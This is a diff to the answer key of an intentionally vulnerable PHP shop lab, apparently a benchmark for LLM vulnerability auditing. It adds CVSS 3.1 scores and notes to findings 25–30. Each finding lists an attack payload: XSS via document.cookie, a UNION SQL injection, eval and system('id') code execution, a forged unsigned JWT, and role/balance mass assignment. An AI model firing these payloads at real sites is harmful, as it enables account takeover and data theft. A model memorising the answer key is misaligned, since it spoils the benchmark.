+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "以 Web 进程身份执行代码，可访问进程持有的业务数据库连接资料及可写运行目录；影响限于应用与容器权限，不将宿主或其他项目计入。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "25",
@@ -860,7 +2401,10 @@
       "severity": "medium",
       "severity_cn": "中",
       "location": [
-        { "path": "app/public/account/profile.php", "line": 3 }
+        {
+          "path": "app/public/account/profile.php",
+          "line": 3
+        }
       ],
       "entry_point": {
         "route": "GET /account/profile.php",
@@ -877,12 +2421,71 @@
         "sink": "echo 输出 <a href>（app/public/account/profile.php:3）",
         "flow": "url → href 属性未转义 → 注入 onmouseover/javascript: 等属性执行脚本"
       },
-      "evidence": ["app/public/account/profile.php:3"],
-      "preconditions": ["需要登录"],
+      "evidence": [
+        "app/public/account/profile.php:3"
+      ],
+      "preconditions": [
+        "受害者已登录并打开带不可信 URL 参数的预览页面；相关浏览器交互发生。"
+      ],
       "attack_input": "?url=\" onmouseover=\"alert(document.cookie)",
       "normal_input": "?url=https://example.com",
       "expected_result": "正常输入渲染链接；恶意输入闭合属性并注入事件脚本（反射型 XSS）",
-      "remediation": "输出属性值前 htmlspecialchars() 转义，并校验协议白名单"
+      "remediation": "输出属性值前 htmlspecialchars() 转义，并校验协议白名单",
+      "description": "个人主页预览把 URL 参数直接插入带引号的 href 属性，没有进行 HTML 属性上下文编码。",
+      "impact": "受害者打开受控个人主页预览并触发相关元素时，不可信输入可进入浏览器执行上下文。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 6.1,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "N",
+          "UI": "R",
+          "S": "C",
+          "C": "L",
+          "I": "L",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 6.1,
+        "environmental_score": 6.1,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "不推定 HttpOnly 会话 Cookie 可直接读取，不串联后台 RCE。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "26",
@@ -891,10 +2494,13 @@
       "class": "auth_bypass",
       "scenario": null,
       "cwe": "CWE-347",
-      "severity": "high",
-      "severity_cn": "高",
+      "severity": "medium",
+      "severity_cn": "中",
       "location": [
-        { "path": "app/public/partner/portal.php", "line": 2 }
+        {
+          "path": "app/public/partner/portal.php",
+          "line": 2
+        }
       ],
       "entry_point": {
         "route": "POST /partner/portal.php",
@@ -911,12 +2517,71 @@
         "sink": "if($payload['role']!=='admin') fail_request(...)（app/public/partner/portal.php:2-3）",
         "flow": "伪造 payload {role:admin} → 不验签 → 通过管理员校验读取全部订单结算"
       },
-      "evidence": ["app/public/partner/portal.php:2"],
-      "preconditions": [],
+      "evidence": [
+        "app/public/partner/portal.php:2"
+      ],
+      "preconditions": [
+        "合作方门户 HTTP 入口可达；不需要真实签名凭证。"
+      ],
       "attack_input": "token=<任意header>.<base64url({role:admin})>.<任意签名>",
       "normal_input": "合作方 token.php 签发的合法 JWT",
       "expected_result": "伪造无有效签名的 token 即可冒充 admin 访问结算数据（身份伪造）",
-      "remediation": "服务端校验 JWT 的 HMAC 签名并验证过期时间"
+      "remediation": "服务端校验 JWT 的 HMAC 签名并验证过期时间",
+      "description": "合作方门户只解码 JWT 载荷并检查 role，没有校验签名、可信签发方或算法。",
+      "impact": "未授权调用者可通过合作方身份检查，读取全部订单的编号与结算金额摘要。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 5.3,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "N",
+          "UI": "N",
+          "S": "U",
+          "C": "L",
+          "I": "N",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 5.3,
+        "environmental_score": 5.3,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "门户中的 admin 是局部载荷字段；代码未给 SHOPSESSID 写入管理员身份，不按整站管理员接管评分。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "27",
@@ -925,11 +2590,17 @@
       "class": "insecure_deserialization",
       "scenario": null,
       "cwe": "CWE-502",
-      "severity": "critical",
-      "severity_cn": "极高",
+      "severity": "high",
+      "severity_cn": "高",
       "location": [
-        { "path": "app/public/ops/jobs.php", "line": 3 },
-        { "path": "app/src/dispatch_job.php", "line": 4 }
+        {
+          "path": "app/public/ops/jobs.php",
+          "line": 3
+        },
+        {
+          "path": "app/src/dispatch_job.php",
+          "line": 4
+        }
       ],
       "entry_point": {
         "route": "POST /ops/jobs.php",
@@ -946,12 +2617,72 @@
         "sink": "shell_exec()（app/src/dispatch_job.php:4）",
         "flow": "job → unserialize(DispatchJob) → __wakeup → 执行自造 command（反序列化 RCE gadget）"
       },
-      "evidence": ["app/public/ops/jobs.php:3", "app/src/dispatch_job.php:4"],
-      "preconditions": ["需要 operator/admin 登录", "伪造 DispatchJob 且 command 为恶意命令"],
+      "evidence": [
+        "app/public/ops/jobs.php:3",
+        "app/src/dispatch_job.php:4"
+      ],
+      "preconditions": [
+        "运营员或管理员权限；可以导入任务数据。"
+      ],
       "attack_input": "base64_encode(serialize(DispatchJob{command:'id'}))",
       "normal_input": "base64_encode(serialize(new DispatchJob()))",
       "expected_result": "正常任务输出 inventory-ready；恶意任务执行 id（反序列化 RCE）",
-      "remediation": "禁止反序列化不可信输入，移除 __wakeup 中的命令执行逻辑"
+      "remediation": "禁止反序列化不可信输入，移除 __wakeup 中的命令执行逻辑",
+      "description": "任务导入直接反序列化输入；已加载的 DispatchJob 在 __wakeup 中把可控 command 送入 shell_exec，类型检查发生在反序列化之后。",
+      "impact": "不可信任务对象在恢复阶段即可触发命令执行，影响业务资料、运行文件和服务资源。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 7.2,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "H",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "H",
+          "A": "H",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 7.2,
+        "environmental_score": 7.2,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "以 Web 进程身份执行代码，可访问进程持有的业务数据库连接资料及可写运行目录；影响限于应用与容器权限，不将宿主或其他项目计入。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "28",
@@ -960,11 +2691,17 @@
       "class": "sqli",
       "scenario": "sqli",
       "cwe": "CWE-89",
-      "severity": "high",
-      "severity_cn": "高",
+      "severity": "low",
+      "severity_cn": "低",
       "location": [
-        { "path": "app/public/account/update.php", "line": 6 },
-        { "path": "app/public/ops/report.php", "line": 3 }
+        {
+          "path": "app/public/account/update.php",
+          "line": 6
+        },
+        {
+          "path": "app/public/ops/report.php",
+          "line": 3
+        }
       ],
       "entry_point": {
         "route": "POST /account/update.php（写入）；GET /ops/report.php（触发）",
@@ -981,24 +2718,92 @@
         "sink": "db()->query() 原始拼接（app/public/ops/report.php:3）",
         "flow": "nickname 存恶意 SQL → operator 对应用户生成报表 → 二次拼接执行（二阶注入）"
       },
-      "evidence": ["app/public/account/update.php:6", "app/public/ops/report.php:3"],
-      "preconditions": ["攻击者先将恶意载荷写入自己 nickname", "operator/admin 对相关 user_id 生成报表"],
+      "evidence": [
+        "app/public/account/update.php:6",
+        "app/public/ops/report.php:3"
+      ],
+      "preconditions": [
+        "普通会员可保存本人昵称。",
+        "运营员或管理员随后为该会员生成报表，执行读取后拼接的查询。"
+      ],
       "attack_input": "nickname=' UNION SELECT username,email,role FROM users -- ",
       "normal_input": "nickname=普通昵称",
       "expected_result": "正常昵称仅回显本人信息；恶意昵称在报表查询时触发注入提取全表",
-      "remediation": "报表查询使用预处理语句；存储侧也做输入校验"
+      "remediation": "报表查询使用预处理语句；存储侧也做输入校验",
+      "description": "资料保存使用参数化写入，因此不是保存时直接注入；运营报表读取已存 nickname 后再拼接 SQL，形成第二次解释。",
+      "impact": "会员保存的昵称会在运营员生成报表时改变查询结构，使报表内容失真；当前响应只返回给运营员，未建立攻击者取得该响应或持久写入业务库的独立路径。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 3.5,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "R",
+          "S": "U",
+          "C": "N",
+          "I": "L",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 3.5,
+        "environmental_score": 3.5,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "保存阶段使用参数化写入，缺陷在后续报表查询重新拼接，保留二次注入类型。",
+          "主评分针对会员植入、另一后台用户触发的场景。查询回显仅在运营员响应中，且本版本关闭模拟预处理；若另行建立攻击者可观察的结果通道或可写入路径，应重新评估 C/I。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide",
+          "https://www.php.net/manual/en/class.pdo-mysql.php#pdo-mysql.constants.attr-multi-statements",
+          "https://raw.githubusercontent.com/php/php-src/php-8.4.27/ext/pdo_mysql/mysql_driver.c",
+          "https://raw.githubusercontent.com/php/php-src/php-8.4.27/ext/pdo/pdo_dbh.c"
+        ]
+      }
     },
     {
       "id": "29",
       "title": "营销排版模板表达式执行",
-      "type": "模板表达式执行",
+      "type": "模板表达式执行（原 /e 场景的 PHP 8.4 等价实现）",
       "class": "code_execution",
       "scenario": null,
       "cwe": "CWE-94",
-      "severity": "critical",
-      "severity_cn": "极高",
+      "severity": "high",
+      "severity_cn": "高",
       "location": [
-        { "path": "app/public/ops/template-render.php", "line": 3 }
+        {
+          "path": "app/public/ops/template-render.php",
+          "line": 3
+        }
       ],
       "entry_point": {
         "route": "POST /ops/template-render.php",
@@ -1015,12 +2820,72 @@
         "sink": "eval()（app/public/ops/template-render.php:3）",
         "flow": "template → 双花括号表达式 → eval() 执行任意 PHP 代码"
       },
-      "evidence": ["app/public/ops/template-render.php:3"],
-      "preconditions": ["需要 operator/admin 登录", "POST 且带 CSRF token"],
+      "evidence": [
+        "app/public/ops/template-render.php:3"
+      ],
+      "preconditions": [
+        "运营员或管理员权限；提交模板排版。"
+      ],
       "attack_input": "template={{ system('id') }}",
       "normal_input": "template=本周精选，共 {{ 2 + 2 }} 款好物",
       "expected_result": "正常表达式输出 4；恶意表达式执行 system('id')（代码执行 RCE）",
-      "remediation": "禁用 eval，改用安全的模板引擎或白名单表达式求值器"
+      "remediation": "禁用 eval，改用安全的模板引擎或白名单表达式求值器",
+      "description": "营销排版对双花括号中的表达式调用 eval，未把表达式限制在安全的模板运算集合。",
+      "impact": "后台模板输入可执行 PHP 表达式并调用进程权限内的危险操作。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 7.2,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "H",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "H",
+          "A": "H",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 7.2,
+        "environmental_score": 7.2,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "以 Web 进程身份执行代码，可访问进程持有的业务数据库连接资料及可写运行目录；影响限于应用与容器权限，不将宿主或其他项目计入。",
+          "这是原 /e 题在 PHP 8.4 的等价实现，不声称 PHP 8.4 仍支持已移除的正则修饰符。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "30",
@@ -1032,8 +2897,14 @@
       "severity": "high",
       "severity_cn": "高",
       "location": [
-        { "path": "app/public/account/update.php", "line": 4 },
-        { "path": "app/public/account/update.php", "line": 6 }
+        {
+          "path": "app/public/account/update.php",
+          "line": 4
+        },
+        {
+          "path": "app/public/account/update.php",
+          "line": 6
+        }
       ],
       "entry_point": {
         "route": "POST /account/update.php",
@@ -1050,12 +2921,83 @@
         "sink": "UPDATE users SET ...（app/public/account/update.php:6）",
         "flow": "POST role=admin / balance=999999 → 直接更新自身敏感字段 → 越权提权/改余额"
       },
-      "evidence": ["app/public/account/update.php:4", "app/public/account/update.php:6"],
-      "preconditions": ["需要登录"],
+      "evidence": [
+        "app/public/account/update.php:4",
+        "app/public/account/update.php:6"
+      ],
+      "preconditions": [
+        "普通会员登录并持有本人资料页面令牌。"
+      ],
       "attack_input": "role=admin&balance=999999",
       "normal_input": "display_name=新昵称",
       "expected_result": "普通用户可把自身 role 改为 admin、balance 改为任意值（批量赋值）",
-      "remediation": "仅允许更新非敏感字段（display_name/nickname/email/homepage），排除 role/balance/tier"
+      "remediation": "仅允许更新非敏感字段（display_name/nickname/email/homepage），排除 role/balance/tier",
+      "description": "资料更新对值使用绑定参数，但字段集合包含 role、balance、tier 等敏感属性，未按普通会员的可编辑字段收窄。",
+      "impact": "会员可改写本人角色和余额，获得后台可读数据及不应自行授予的财务、会员权益。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 7.1,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "L",
+          "I": "H",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 7.1,
+        "environmental_score": 7.1,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "绑定参数约束值的 SQL 语法，不能弥补字段授权；不将其他编号的后台 RCE 链或泛化请求洪泛加算为本项可用性影响。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     }
-  ]
+  ],
+  "rating_standard": "CVSS:3.1",
+  "score_basis": "Base",
+  "provenance": {
+    "repository": "https://github.com/Luchutong/llm-vuln-audit",
+    "ref": "feat/lab30-shop",
+    "commit": "30364ecd8f1c7c8c10e3f2e66107dfc38ecd1434",
+    "path": "answers/answers.json",
+    "answers_sha256": "839decac147362e43166fc4da742b9af2ea4c5c9f38ca8f8f2be45c9496c20ff",
+    "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+    "specification": "https://www.first.org/cvss/v3.1/specification-document"
+  }
 }
